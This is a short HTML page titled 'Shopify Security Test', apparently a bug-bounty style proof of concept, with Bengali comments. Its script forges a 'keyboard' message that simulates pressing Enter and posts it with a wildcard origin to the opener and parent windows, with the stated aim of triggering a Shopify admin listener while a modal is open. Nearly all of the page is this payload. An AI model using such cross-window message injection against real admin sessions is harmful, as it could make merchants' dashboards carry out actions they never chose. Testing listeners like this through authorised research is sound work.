<!DOCTYPE html>
<html>
<head>
    <title>Shopify Security Test</title>
</head>
<body>
    <h1>Security Vector Testing</h1>
    <script>
        // শপিফাইয়ের সেই লিসেনার ট্রিগার করার জন্য ফাইনাল পেলোড
        const payload = {
            type: "keyboard",
            payload: { 
                keys: ["Enter"], 
                held: [] 
            },
            signature: "test" 
        };

        // শপিফাই অ্যাডমিনের সাথে যোগাযোগ স্থাপন
        // শপিফাইয়ের যদি কোনো মোডাল খোলা থাকে, তবে এটি মেসেজ পাঠাবে
        window.opener?.postMessage(payload, "*");
        window.parent?.postMessage(payload, "*");
        
        console.log("Payload has been dispatched!");
    </script>
</body>
</html>
